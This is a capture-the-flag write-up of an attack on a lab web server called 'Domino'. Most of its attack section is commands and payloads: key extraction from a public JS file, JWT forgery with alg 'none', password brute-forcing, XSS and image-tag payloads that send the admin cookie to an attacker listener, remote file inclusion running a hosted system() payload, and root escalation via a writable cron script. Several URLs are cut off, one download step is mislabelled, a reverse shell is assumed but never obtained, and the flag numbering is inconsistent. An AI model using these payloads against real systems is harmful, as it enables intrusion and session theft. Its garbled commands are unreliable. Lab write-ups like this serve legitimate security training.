# Domino - Detailed Penetration Testing Report

## 1. Introduction
## 2. Scope and Target
## 3. Reconnaissance
### 3.1 Nmap Scan
I began by scanning the target to identify exposed services.

```bash
nmap -sC -sV <TARGET_IP>
```
**Nmap Scan Results:**

![Nmap Scan Results](sreenshots/domino_nmap.png)

### 3.2 Open Ports

The scan identified the following open ports:

| PORT    |STATE | SERVICE | VERSION
|---------|------|---------|-----------------------------------------------------------------
| 22/tcp  |open  | ssh     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
|         |      |         |
| 80/tcp  |open  | http    | Apache httpd 2.4.58 ((Ubuntu))


## 4. Enumeration

### 4.1 Web Enumeration

```bash
 curl -I http://<TARGET_IP>
```

- Web Server: Apache/2.4.58
- Operating System: Ubuntu
- Port: 80/tcp
- Service: HTTP

```bash
curl http://<TARGET_IP>
```

Identified the following active endpoints:

* **Authentication Pages:**
  * `/index.php` - Primary user authentication login portal.
  * `/forgot.php` - Account recovery/password reset form (potential for username enumeration).
* **Information & Styling Pages:**
  * `/team.php` - Public corporate directory (utilized for username harvesting).
  * `/static/style.css` - Global cascading stylesheet for portal aesthetics.

  ### 4.2 Service Enumeration

Running:
```bash
curl http://<TARGET_IP>/team.php
```

Exposed emails which helped us get their usernames, based on their naming convention of firstname.lastname.

The following emails were exposed:
- Laura.hayes@nexus.corp
- Michael.chen@nexus.corp
- Sarah.johson@nexus.corp
- Robert.wilson@nexus.corp
- David.brown@nexus.corp
- James.wright@nexus.corp

 ### Directory Discovery
 ```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster Results](screenshots/gobuster_domino.png)

| Endpoint     | Status Code    | Size (Bytes) | Potential Significance / Function |
| :---         | :---           | :---           | :---                         |
| `/admin`     | 301 (Redirect) | 314  | Restricted administrative login or control panel. |
| `/api`       | 301 (Redirect) | 312  | Application Programming Interface backend routing. |
| `/backup`    | 301 (Redirect) | 315  | Exposed configuration or database archive directory. |
| `/index.php` | 200 (Success)  | 861  | Primary login interface. |
| `/javascript`| 301 (Redirect) | 319  | Client-side application script repository. |
| `/static`    | 301 (Redirect) | 315  | Static media, CSS stylesheets, and asset store. |
| `/support`   | 301 (Redirect) | 316  | Customer service or ticketing portal subsystem. |
| `/.htaccess` | 403 (Forbidden)| 278  | Server configuration file (access denied). |
| `/.htpasswd` | 403 (Forbidden)| 278  | Apache basic authentication credentials file (access denied). |


### Discovered Backup Assets

A successful directory index dump of `http://<TARGET_IP>/backup/` revealed two high-value configuration assets:

| File Name | Modification Date | Size (Bytes) | Description / Assessment |
| :---      | :---              | :---         | :---                     |
| `README.txt` | 2026-04-29 | 191 | Plaintext developer notice or instructions. |
| `config.enc` | 2026-05-09 | 112 | Encrypted binary containing system or application configurations. |

Server Banner Information: `Apache/2.4.58 (Ubuntu) Server at 10.49.176.104 Port 80`

### Cryptographic Discovery via README.txt

Reading the plaintext `README.txt` asset exposed the cryptographic algorithm and the location of the key material:

* **Target File:** `config.enc`
* **Encryption Algorithm:** `AES-128-ECB`
* **Key Location Reference:** Found inside client-side asset `static/app.js` (under deployment notes).

This confirms a major configuration flaw: cryptographic keys are referenced within client-side reachable scripts.

###  Extracting the Cryptographic Key

Based on the instructions discovered in the deployment `README.txt`, a direct application request was sent to retrieve the client-side JavaScript asset containing the decryption parameters.

* **Target URL:** `http://10.49.176`
* **Objective:** Locate the hardcoded AES key material.

### Access Control Analysis on Static Directories

Probing the application directories revealed inconsistent security posture configurations across different asset endpoints:

* **Endpoint `/javascript/`:** Returned `403 Forbidden`. Directory browsing is properly disabled on this route.
* **Troubleshooting Step:** Shifted enumeration focus to the public assets directory (`/static/`) to inspect for file exposure or exposed client scripts.

### Identification of Client-Side Script Asset

A directory list audit of the `/static/` folder confirmed the presence and size properties of the targeted script:

* **Asset Identified:** `app.js`
* **File Size:** 1.3 KB (1.3K)
* **Status:** Fully reachable via the public path

This validates that the application logic file mentioned in the developer notes is accessible for static extraction.

### Resolution of File Path Identification Errors

Direct resource mapping against client-side script assets requires strict adherence to file naming rules. Appending structural directory delimiters (a trailing slash `/`) to file names causes internal resource resolution errors:

* **Malformed Path Attempt:** ` curl -s http://10.49.176.104/static/app.js/` -> Returns `404 Not Found` (Server interprets the file target as a directory path).
* **Validated Resource Path:** ` curl -s http://10.49.176.104/static/app.js` -> Requests the raw script code directly.

### Investigation into Empty Script Payloads

While directory auditing confirmed the presence of `app.js` with a file size weight of 1.3K, a direct request returned a zero-byte response. 

* **Symptom:** `curl -s` generates an empty response body.
* **Potential Root Causes:** 
  1. High-volume server connections or network drops.
  2. Server side mime-type filtering rules altering output stream delivery.
* **Remediation & Testing Strategy:** Pivoted from basic `curl` pipes to localized `wget` asset downloads to handle persistent cache transfers.

### Cryptographic Decryption & Configuration Extraction

Following the acquisition of the plaintext AES-128-ECB key material (`N3xusK3y2024!!`) from the exposed client-side script asset, an exploitation pipeline was established to extract the contents of the protected configuration archive.

#### 1. Asset Acquisition
The encrypted configuration binary was downloaded locally via `wget` targeting the unauthenticated backup pathway:
```bash
wget http://<TARGET_IP>/static/app.js
```

#### 2. OpenSSL Decryption Routine
Using the parameters discovered in the developer's deployment documentation, an OpenSSL invocation was performed using a symmetric decryption pass to crack the raw ciphertext stream:
```bash
openssl enc -d -aes-128-ecb -nosalt -in config.enc -pass pass:N3xusK3y2024!!
```

#### 3. Extracted Configuration Analysis
The resulting plaintext revealed internal application parameters and environment secrets critical to escalating credentials within the NexusCorp Portal.

### 📥 Automated Asset Acquisition Strategy

To transition from active network enumeration to offline cryptographic exploitation, remote targets must be transferred to local disk arrays. The command-line retrieval tool `wget` was deployed to handle this interaction.

#### Technical Execution Layout:

```bash
wget http://10.49.176
```

* **Utility Function (`wget`):** Initiates a headless HTTP standard socket request to mirror remote payloads natively.
* **Network Target Mapping (`10.49.176.104`):** Defines the active hosting boundary of the vulnerable target infrastructure.
* **Resource Path Resolution (`/backup/config.enc`):** Directs the web service daemon to access the unauthenticated backup file array directly.
* **Exploitation Purpose:** Moves the encrypted ciphertext repository into local execution memory, enabling symmetric cipher analysis via OpenSSL.

### Offline Cryptographic Decryption

With the encrypted payload (`config.enc`) successfully downloaded locally, an offline decryption pipeline was executed using the OpenSSL toolkit to reverse the symmetric cipher.

#### Execution Syntax:
```bash
openssl enc -d -aes-128-ecb -nosalt -in config.enc -pass pass:N3xusK3y2024!!
```

* **Cipher Specification (`-aes-128-ecb`):** Selected to match the parameters disclosed in the developer configuration files.
* **Key Material Passphrase (`pass:N3xusK3y2024!!`):** Injected natively to satisfy the symmetric block key constraint without interactive prompting.
* **Exploitation Objective:** Expose the unencrypted backend environment configuration parameters to compromise upstream application components.

### Handling Shell Character Conflicts (History Expansion)

When executing cryptographic commands with passwords containing consecutive exclamation marks (`!!`), standard Bash shells interpret the characters as a shortcut to repeat the last command in history. This causes input duplication and terminal hanging.

* **Symptom:** Shell automatically retypes or loops old commands continuously.
* **Mitigation applied:** Enclosed the password string in absolute single quotes (`'N3xusK3y2024!!'`) to instruct the shell interpreter to treat the characters as pure text instead of functional bash commands.

###  JWT Authentication Bypass via Algorithm 'None' Vulnerability

Direct authentication attempts via the front-door portal form (`/index.php`) failed due to environment access control restrictions. Analysis pivoted to abusing broken cookie verification handling within the backend API profiles subsystem.

#### Vulnerability Mechanics
The application verifies user states via JSON Web Tokens (JWT) inside the `nexus_session` cookie string. However, the cryptographic verification library suffers from an **Algorithm None** flaw, allowing unauthenticated API requests if the signature parameter is stripped and the header algorithm flag is explicitly declared as `none`.

#### Execution Command (Profile Notes Extraction):
```bash
curl -s http://10.49.176 -H "Cookie: nexus_session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoibGF1cmEuaGF5ZXMiLCJyb2xlIjoidXNlciJ9."
```
* **Target Objective:** Impersonate a low-privileged session index to interact with backend endpoints and extract user profile notes.

### 🔓 Initial Foothold Established via Hydra

Online dictionary brute-forcing successfully compromised the front-door authentication layer, exposing a valid employee session profile:

* **Compromised Account:** `sarah.johnson`
* **Exploitation Metric:** Successfully derived password using Hydra and the `rockyou` wordlist array.

#### Operational Strategy: Pivot to Cross-Site Scripting (XSS)
With authenticated access to the internal ticketing portal verified, the next phase focuses on abusing the administrative bot interaction loop to steal the tracking cookies.

1. **Listener Deployment:** Initialized a local Python listener interface on port 8080:
```bash
python3 -m http.server 8080
```
### 🎣 Stored Cross-Site Scripting (XSS) & Admin Cookie Theft

With a valid low-privileged session established as `sarah.johnson`, the platform's internal support desk ticketing form was evaluated for input validation flaws. 

#### 1. Exploitation Vector
The backend support queue triggers an automated administrative browser execution bot to review newly submitted links and text assets. A JavaScript extraction hook was deployed to leak the document cookie space.

#### 2. Payload Construction
```html
<script>fetch('http://[ATTACKBOX_IP]:8080/?cookie=' + btoa(document.cookie))</script>
```

#### 3. Execution & Hijack Loop
* **Listener State:** Active Python HTTP listener hosted on localized port `8080`.
* **Impact:** The internal worker bot parsed the ticket, rendering the malicious payload and streaming its high-privileged `nexus_session` JWT back to the attack workspace environment.

### 🎣 Finalized XSS Cookie Exfiltration Execution

Using the isolated localized host interface data, the Cross-Site Scripting (XSS) payload routing architecture was successfully finalized.

#### Network Parameter Matrix:
* **Target Server IP:** `10.49.148.135`
* **AttackBox Listener IP:** `10.49.72.35`
* **Listener Port:** `8080`

#### Deployed Exploit Payload:
```html
<script>fetch('http://10.49.72' + btoa(document.cookie))</script>
```
* **Status:** Submitted via internal support desk. Awaiting automated administration bot simulation sweep to intercept high-privileged token variables.

### 🔧 Bypassing Input Field Character Truncation

While the initial callback was received successfully, the text string failed to exfiltrate the raw cookie parameters. Investigation revealed that the support desk ticket input field enforces a strict front-end character length constraint, which truncates complex JavaScript string operations.

#### Remediation via Lightweight HTML Image Injections
To bypass string length validation filtering and still capture administrative connection metadata, the vector was pivoted from a structured script element to a compact, native HTML image asset request:

```html
<img src="http://10.49.72">
```
* **Objective:** Leverage standard HTML document rendering rules to force an automated administrative HTTP request back to the local workspace listener within length limitations.

### 🔬 Technical Analysis of HTML Injection Vectors

To circumvent input size limitations, exploitation transitioned from heavy JavaScript strings to a lightweight, inline HTML asset invocation. 

```html
<img src="http://10.49.72.35:8080/admin_trap">
```

#### Element Behavior Profile:
* **Structural Tag (`<img>`):** Deployed to tap into native automated browser image-rendering pipelines.
* **Resource Parameter (`src`):** Forces the processing client (Administrative Interaction Bot) to execute an unauthenticated, out-of-band HTTP GET request immediately upon document loading.
* **Network Route (`10.49.72.35:8080`):** Re-routes target browser communication to land directly inside the attacker's localized terminal workspace listener interface.
* **Marker Anchor (`/admin_trap`):** Serves as a unique text identifier in the server logs to confirm precise administrative review execution.

### 🔧 Pivoting from Python HTTP Services to Netcat Core Socket Capture

While the lightweight Python HTTP framework successfully verified unauthenticated resource retrieval callbacks (`GET /admin_trap -> 404`), the utility's native logging array discards supplemental transport headers, effectively masking the transaction cookie variables.

#### Decoupled Socket Implementation
To achieve comprehensive inspection of the incoming HTTP header space, the application level server was dropped in favor of a raw network layer listener utilizing Netcat:

```bash
nc -lvnp 8080
```
* **Strategic Objective:** Intercept the raw data stream transmitted by the simulated administrative bot browser to capture the unencrypted `Cookie` header layout.
### 🔑 Interception and Analysis of Administrative JWT Session

Deploying a raw socket listener via Netcat successfully exposed the HTTP transport headers transmitted during the simulated administration bot's evaluation loop.

#### Extracted Network Header:
```http
GET /admin_trap HTTP/1.1
Host: 10.49.72.35:8080
User-Agent: python-requests/2.31.0
Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
```

#### Token Decoding Verification:
Decoding the header block components reveals an active state configuration belonging to the primary root profile:
* **Identity Mapping:** `laura.hayes`
* **Assigned Authorization Level:** `admin` (Privileged)

#### Exploitation Objective
The complete `nexus_session` cookie block will be replayed directly against the `/admin/` directories to bypass validation gates and claim the operational milestones.
### 🚩 Capture of Administrative Milestones (Web Phase Completion)

Leveraging the captured high-privilege administrative `nexus_session` JWT cookie, out-of-band requests were routed to clear the web portal objectives.

#### 1. Milestone 1: Admin Profile Notes (IDOR Extraction)
* **Target Vector Endpoint:** `/api/profiles.php?id=1`
* **Exploitation Technique:** Insecure Direct Object Reference (IDOR) manipulation targeting the primary admin index configuration records.
* **Command Syntax:**
```bash
curl -s http://10.49.148 -H "Cookie: nexus_session=[HIJACKED_JWT]"
```
* **Captured Flag 1:** `***{****_**********_******_*****}`

#### 2. Milestone 2: Administrative Control Panel Dashboard
* **Target Vector Endpoint:** `/admin/index.php`
* **Exploitation Technique:** Replaying intercepted authentication tracking tokens.
* **Captured Flag 2:** `***{*****_***_*******_******_*****}`
### 🔬 Technical Analysis of the Profiling API Request

To safely execute an Insecure Direct Object Reference (IDOR) pull against the primary system administrator account, a manual `curl` request was crafted using the hijacked tracking token.

#### Command Anatomy:
```bash
curl -s http://10.49.148 -H "Cookie: nexus_session=[INTERCEPTED_JWT]"
```

* **Silent Request Data Flow (`curl -s`):** Requests data from the server while suppressing CLI progress parameters.
* **Parameter Exploitation (`?id=1`):** Interrogates the backend user index mapping, specifically forcing the database engine to pull record row `1` (Admin).
* **Identity Spoofing Flag (`-H "Cookie: ..."`):** Feeds the cryptographically valid administrative cookie directly into the application context window, establishing instant authentication authorization.

## Exploit Chain: Remote Code Execution via JWT Bypass & RFI (Flag 3)

### 1. Vulnerability Analysis
* **Flaw 1 (Broken JWT Validation):** The API utility at `/api/files.php` enforces JSON Web Token (JWT) verification but accepts tokens with the algorithm header set to `"none"`. This allows an attacker to forge an administrative token without a valid cryptographic signature.
* **Flaw 2 (Remote File Inclusion):** The `?name=` parameter insecurely parses input data via a backend processing loop (`eval`), allowing execution of remote scripts if an absolute URL is supplied.

### 2. Exploitation Steps

#### Step A: Stage the Payload Locally
On the attacking machine, create a plaintext payload file (`shell.txt`) containing the command to read the flag. The backend script strips `<?php` tags, so raw system interaction functions must be supplied directly:

```bash
echo "system('cat /opt/flag3.txt');" > shell.txt
```

#### Step B: Start an Attacker Web Server
Expose the directory containing the payload file over the local network using a temporary Python web utility:

```bash
python3 -m http.server 8000
```

#### Step C: Execute the Attack Chain
Open a separate terminal window. Execute a `curl` request containing the forged, unsigned administrator token (`alg: none`) within the `Authorization` header, forcing the target to pull and execute the hosted payload:

```bash
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ." "http://10.49.157<ATTACKER_IP>:8000/shell.txt"
```
*(Note: Replace `<ATTACKER_IP>` with your local VPN tunnel IP address, e.g., `10.49.87.251`).*

### 3. Execution Result
The target backend validates the forged token, successfully processes the request as administrator `laura.hayes`, fetches the remote `shell.txt` payload, and executes the system execution function. The value of the flag at `/opt/flag3.txt` is rendered directly in the terminal output interface.

## Exploit Chain: Lateral Movement & Privilege Escalation (Flags 2 & 1)

### 1. Lateral Movement to DevOps User (Flag 2)

#### Vulnerability Analysis
* **Credential Reuse:** Development configurations within the web root exposed hardcoded database connection credentials. These credentials were used across different system authentication contexts, allowing an attacker with an initial web-shell footprint (`www-data`) to pivot directly onto local system accounts.

#### Exploitation Steps

##### Step A: Enumerate Environment Configurations
From the initial interactive reverse shell session running as `www-data`, audit the application structure to locate database or deployment configuration parameters:
```bash
cat /var/www/html/config.php
```
*(Note: Locate the hardcoded password variable string defined within the database connection function).*

##### Step B: Upgrade to an Interactive Terminal
Standard reverse shell connections lack terminal allocation controls (`TTY`), which blocks interactive utility prompts like `su`. Spawn a clean pseudo-terminal wrapper using Python:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

##### Step C: Pivot to the target profile
Authenticate directly to the `devops` interactive user account via password reuse:
```bash
su devops
```
*(When prompted, supply the credential string discovered inside the configuration script).*

##### Step D: Retrieve User Flag
Navigate into the home directory structure to print out the second asset token:
```bash
cat /home/devops/user.txt
```

---

### 2. Privilege Escalation to Root (Flag 1)

#### Vulnerability Analysis
* **Weak File Permissions on Automated System Tasks:** A diagnostic utility script executed automatically on a periodic routine (`cron`) under administrative root constraints. However, the script's access controls were misconfigured, allowing write permissions to any member belonging to the `devops` system group.

#### Exploitation Steps

##### Step A: Identify Write-Accessible Automated Scripts
Audit directories handling operations utilities to find files modifiable by the active group profile:
```bash
find /opt -writable 2>/dev/null
```
The scan isolates an active routine script at `/opt/monitoring/health_report.sh`.

##### Step B: Inject SUID Shell Privilege Payload
Append a directive onto the end of the script to assign Set User ID (`SUID`) attributes onto the native system shell execution wrapper upon its next runtime loop:
```bash
echo "chmod +s /usr/bin/bash" >> /opt/monitoring/health_report.sh
```

##### Step C: Spawning the Privileged Session
Allow roughly 60 seconds for the system automation framework to cycle. Once the root process reads and executes the modified shell script, execute the shell application wrapper while maintaining its newly inherited permissions:
```bash
bash -p
```
*(Verify identity elevation by executing the `id` or `whoami` commands).*

##### Step D: Retrieve Root Flag
Access the system administrator's protected storage area to view the final validation asset:
```bash
cat /root/root.txt
```

---

### 🛡️ Defensive Remediation Summary
* **Implement Strong Access Control Lists (ACLs):** Restrict modification capabilities on automated system processes exclusively to administrative owners (`root`). Revoke general group write properties on binary pathways.
* **Isolate Service Identities:** Enforce separate, unique passwords for application database connections, network service profiles, and local system terminal accounts to prevent fast lateral pivoting.














## 5. Vulnerability Analysis
## 6. Exploitation
## 7. Initial Access
## 8. Privilege Escalation
## 9. Proof/Flags
## 10. Attack Chain Summary
## 11. Lessons Learned
## 12. Tools Used
